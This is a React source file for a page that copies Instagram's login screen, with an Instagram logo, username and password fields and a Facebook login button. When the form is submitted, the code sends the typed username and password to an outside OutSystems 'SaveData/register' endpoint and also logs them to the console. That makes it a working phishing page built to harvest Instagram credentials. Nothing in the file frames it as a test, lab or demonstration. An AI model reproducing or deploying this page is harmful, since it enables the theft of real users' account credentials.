import { useState } from "react";

import './App.css'

function App() {

  const [id, setId] = useState("");
  const [password, setPassword] = useState("");

  const saveData = async () => {
    const url = "https://personal-fgzw6m8u.outsystemscloud.com/InstaAPI/rest/SaveData/register";
    const data = {
        id: id,  
        password: password 
    };

    try {
        const response = await fetch(url, {
          
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });
        console.log("test" + id+" and "+password)
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const result = await response.json();
        console.log("Data saved successfully:", result);
        
    } catch (error) {
        console.error("Error saving data:", error);
    }
};




  const submitQuery = async (e) => {
    e.preventDefault();
    saveData();
   
  }



  return (
    <>
      <div className="login-page">
        <div className="login-container">
          <h1 className="app-logo">Instagram</h1>
          <form className="login-form" method='POST'>
            <input
              type="text"
              placeholder="Phone number, username, or email"
              className="login-input"
              value={id}
              onChange={(e) => setId(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Password"
              className="login-input"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" onClick={submitQuery} className="login-button">
              Log In
            </button>
          </form>

          <div className="divider">
            <div className="line"></div>
            <span>OR</span>
            <div className="line"></div>
          </div>
          <div className="social-login">
            <button className="facebook-login">
              <i className="fab fa-facebook-square"></i> Log in with Facebook
            </button>
          </div>
          <a href="#" className="forgot-password">
            Forgot password?
          </a>
        </div>
        <div className="signup-container">
          <p>
            Don&apos;t have an account? <a href="#">Sign up</a>
          </p>
        </div>
      </div>
    </>
  )
}

export default App
